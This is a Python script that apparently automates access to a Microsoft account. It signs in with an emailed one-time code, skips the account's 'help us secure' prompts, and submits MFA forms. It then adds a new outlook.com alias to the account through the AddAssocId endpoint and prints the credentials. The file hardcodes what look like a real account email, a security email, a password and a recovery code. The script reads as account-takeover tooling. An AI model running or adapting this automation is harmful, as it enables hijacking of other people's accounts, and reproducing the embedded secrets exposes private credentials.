"""Probe recover-interrupt + OAuth MFA paths for names/manage elevation."""
from __future__ import annotations

import asyncio
import logging
import re
import time
import uuid
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

from database.database import DBConnection
from securing.auth.get_msaauth import get_msaauth
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.auth.send_auth import send_auth
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.proxy import close_session
from securing.utils.security.change_primary_alias import (
    _emails_from_manage,
    _extract_canary,
)
from securing.utils.security_information import (
    _extract_email_otc_proof,
    _extract_form_action,
    _extract_hidden_fields,
    _extract_url_post_sft,
    _find_t0,
    _page_debug,
    _page_id,
    _sso_fields,
)

EMAIL = "amazing_fam.iyq28s64@outlook.com"
SEC = "b7419f2164e04615@ilovevbucks.site"
PWD = "BbfaNujX1rcKRq"
RC = "R3ATA-GE79D-C3R9F-NQ8QT-QUJ38"


def dump(name: str, text: str, url: str = "") -> None:
    Path("/tmp").joinpath(name).write_text(text or "", encoding="utf-8", errors="replace")
    print(
        f"SAVED {name} url={url} len={len(text or '')} "
        f"debug={_page_debug(text or '', url=url)[:220]}"
    )


async def main() -> None:
    with DBConnection() as db:
        db.add_security_email(SEC, PWD)

    session = get_session()
    try:
        info = await send_auth(session, EMAIL, SEC)
        proofs = (
            (info.get("response") or {})
            .get("Credentials", {})
            .get("OtcLoginEligibleProofs")
            or []
        )
        if not proofs:
            print("no proofs", info)
            return
        flowtoken = proofs[0]["data"]
        print("waiting OTP…")
        code = await get_email_code(SEC, timeout=120)
        print("OTP", code)
        if not code:
            return

        live = await livedata(session)
        msa = await get_msaauth(
            session,
            EMAIL,
            flowtoken,
            {"urlPost": live["urlPost"], "ppft": info.get("ppft") or live["ppft"]},
            code,
        )
        if isinstance(msa, str):
            handled = await handle_redirects(session, msa)
            msa = handled if isinstance(handled, dict) else get_data(msa)
        if not msa:
            print("no msa")
            return
        await polish_host(session, msa if isinstance(msa, dict) else {})
        print("polished")

        r = await session.get(
            "https://account.live.com/names/manage", follow_redirects=True
        )
        text = r.text or ""
        dump("manage1.html", text, str(r.url))

        for hop in range(8):
            fields = _extract_hidden_fields(text)
            action = _extract_form_action(text, str(r.url))
            if "pprid" in fields and action:
                print("POST form", action[:140], list(fields)[:6])
                r = await session.post(
                    action,
                    data=fields,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )
                text = r.text or ""
                dump(f"hop{hop}.html", text, str(r.url))
                continue
            sso, _missing = _sso_fields(text)
            if sso:
                r = await session.post(
                    sso["action"],
                    data={
                        "pprid": sso["pprid"],
                        "NAP": sso["NAP"],
                        "ANON": sso["ANON"],
                        "t": sso["t"],
                    },
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )
                text = r.text or ""
                dump(f"sso{hop}.html", text, str(r.url))
                continue
            break

        print(
            "after hops canary",
            bool(_extract_canary(text)),
            "t0",
            bool(_find_t0(text)),
            "pageId",
            _page_id(text),
        )
        print("emails", _emails_from_manage(text)[:8])

        if (
            _find_t0(text)
            or "help us secure" in text.lower()
            or "help us protect" in text.lower()
        ):
            for key in (
                "apiCanary",
                "canary",
                "sEncryptedNetId",
                "encryptedNetId",
                "urlPost",
                "skipUrl",
                "cancel",
            ):
                m = re.search(
                    rf'"{key}"\s*:\s*("([^"\\]*(?:\\.[^"\\]*)*)"|true|false)',
                    text,
                )
                if m:
                    print(key, (m.group(1) or "")[:160])
            for m in re.finditer(r'<form[^>]*action="([^"]*)"[^>]*>', text, re.I):
                print("form action", m.group(1)[:160])
            skip = re.search(r'"skip"\s*:\s*\{\s*"url"\s*:\s*"([^"]+)"', text)
            if skip:
                skip_url = skip.group(1).replace("\\u0026", "&")
                print("SKIP URL", skip_url[:200])
                rs = await session.get(skip_url, follow_redirects=True)
                dump("skip.html", rs.text or "", str(rs.url))
                text = rs.text or ""
                print(
                    "after skip canary",
                    bool(_extract_canary(text)),
                    "pageId",
                    _page_id(text),
                )

        local = f"sunny{uuid.uuid4().hex[:8]}"
        canary = _extract_canary(text) or ""
        print("posting AddAssocId canary?", bool(canary), local)
        add = await session.post(
            "https://account.live.com/AddAssocId",
            data={
                "canary": canary,
                "PostOption": "NONE",
                "SingleDomain": "outlook.com",
                "UpSell": "",
                "AddAssocIdOptions": "LIVE",
                "AssociatedIdLive": local,
            },
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://account.live.com/names/manage",
            },
            follow_redirects=True,
        )
        dump("addassoc.html", add.text or "", str(add.url))

        add_text = add.text or ""
        if (
            "oauth20_authorize" in str(add.url)
            or "acr_values" in add_text
            or "login.live.com" in str(add.url)
        ):
            print("OAUTH / LOGIN MFA PAGE")
            url_post, sft = _extract_url_post_sft(add_text)
            proof = _extract_email_otc_proof(add_text)
            print(
                "urlPost",
                bool(url_post),
                "sft",
                bool(sft),
                "proof",
                proof.get("display") if proof else None,
            )
            if url_post and sft and proof:
                t0 = time.time()
                send = await session.post(
                    url_post,
                    data={
                        "login": EMAIL,
                        "loginfmt": EMAIL,
                        "SentProofIDE": proof["data"],
                        "PPFT": sft,
                        "type": "18",
                        "GeneralVerify": "false",
                        "canary": "",
                        "sacxt": "1",
                        "hpgrequestid": "",
                        "hideSmsInMfaProofs": "false",
                        "AddTD": "true",
                        "ProofConfirmation": "",
                    },
                    follow_redirects=True,
                )
                dump("mfa_type18.html", send.text or "", str(send.url))
                code2 = await get_email_code(SEC, timeout=90, since=t0)
                print("MFA OTP", code2)
                if code2:
                    url_post2, sft2 = _extract_url_post_sft(send.text or "")
                    if not url_post2:
                        url_post2, sft2 = url_post, sft
                    conf = await session.post(
                        url_post2,
                        data={
                            "login": EMAIL,
                            "loginfmt": EMAIL,
                            "otc": code2,
                            "SentProofIDE": proof["data"],
                            "PPFT": sft2 or sft,
                            "type": "19",
                            "GeneralVerify": "false",
                            "AddTD": "true",
                            "canary": "",
                            "sacxt": "1",
                            "hpgrequestid": "",
                            "hideSmsInMfaProofs": "false",
                            "infoPageShown": "1",
                            "ProofConfirmation": SEC,
                        },
                        follow_redirects=True,
                    )
                    dump("mfa_submit.html", conf.text or "", str(conf.url))
                    # follow continue forms
                    ctext = conf.text or ""
                    for hop in range(6):
                        fields = _extract_hidden_fields(ctext)
                        action = _extract_form_action(ctext, str(conf.url))
                        if "pprid" in fields and action:
                            conf = await session.post(
                                action,
                                data=fields,
                                headers={
                                    "Content-Type": "application/x-www-form-urlencoded"
                                },
                                follow_redirects=True,
                            )
                            ctext = conf.text or ""
                            dump(f"mfa_hop{hop}.html", ctext, str(conf.url))
                            continue
                        break
                    r2 = await session.get(
                        "https://account.live.com/names/manage", follow_redirects=True
                    )
                    dump("manage_after_mfa.html", r2.text or "", str(r2.url))
                    print(
                        "canary after mfa",
                        bool(_extract_canary(r2.text)),
                        _emails_from_manage(r2.text or "")[:10],
                    )

        print("\nCREDS", EMAIL, SEC, PWD, RC)
    finally:
        await close_session(session)


if __name__ == "__main__":
    asyncio.run(main())
